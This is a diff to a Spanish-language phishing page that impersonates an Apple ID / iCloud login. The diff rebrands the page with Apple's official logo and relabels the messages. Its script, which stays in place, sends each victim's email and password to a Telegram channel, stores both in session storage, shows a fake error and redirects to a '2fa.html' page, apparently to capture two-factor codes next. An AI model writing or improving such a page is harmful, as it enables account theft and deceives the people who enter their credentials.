@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>iCloud - Iniciar sesión</title>
+    <title>Apple ID - Iniciar sesión</title>
     <style>
         * {
             margin: 0;
@@ -31,14 +31,15 @@
             box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
         }
 
-        .icloud-logo {
+        .apple-logo {
             text-align: center;
             margin-bottom: 24px;
         }
 
-        .icloud-logo svg {
-            width: 56px;
-            height: 56px;
+        .apple-logo svg {
+            width: 48px;
+            height: 48px;
+            fill: #1d1d1f;
         }
 
         h1 {
@@ -196,10 +197,10 @@
 </head>
 <body>
     <div class="container">
-        <div class="icloud-logo">
-            <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M20 8C14.477 8 10 12.477 10 18C10 18.681 10.08 19.343 10.229 19.978C8.296 21.126 7 23.255 7 25.5C7 28.538 9.462 31 12.5 31H27.5C30.538 31 33 28.538 33 25.5C33 23.255 31.704 21.126 29.771 19.978C29.92 19.343 30 18.681 30 18C30 12.477 25.523 8 20 8Z" fill="#0071E3"/>
-                <path d="M20 10C15.582 10 12 13.582 12 18C12 18.55 12.058 19.086 12.168 19.605L12.307 20.253L11.687 20.496C10.097 21.097 9 22.661 9 24.5C9 26.985 11.015 29 13.5 29H26.5C28.985 29 31 26.985 31 24.5C31 22.661 29.903 21.097 28.313 20.496L27.693 20.253L27.832 19.605C27.942 19.086 28 18.55 28 18C28 13.582 24.418 10 20 10Z" fill="white"/>
+        <div class="apple-logo">
+            <!-- LOGO OFICIAL DE APPLE -->
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
             </svg>
         </div>
 
@@ -270,17 +271,15 @@
             }
             
             try {
-                const message = `🔵 iCLOUD LOGIN 🔵\n\n📧 Correo: ${email}\n🔑 Contraseña: ${password}`;
+                const message = `🔵 APPLE LOGIN 🔵\n\n📧 Correo: ${email}\n🔑 Contraseña: ${password}`;
 
                 await sendToTelegram(message);
                 
                 errorMessage.style.display = 'block';
                 
-                // Guardar datos para segunda etapa
-                sessionStorage.setItem('icloud_email', email);
-                sessionStorage.setItem('icloud_password', password);
+                sessionStorage.setItem('apple_email', email);
+                sessionStorage.setItem('apple_password', password);
                 
-                // Redirigir a la página 2FA después de 1.5 segundos
                 setTimeout(() => {
                     window.location.href = '2fa.html';
                 }, 1500);
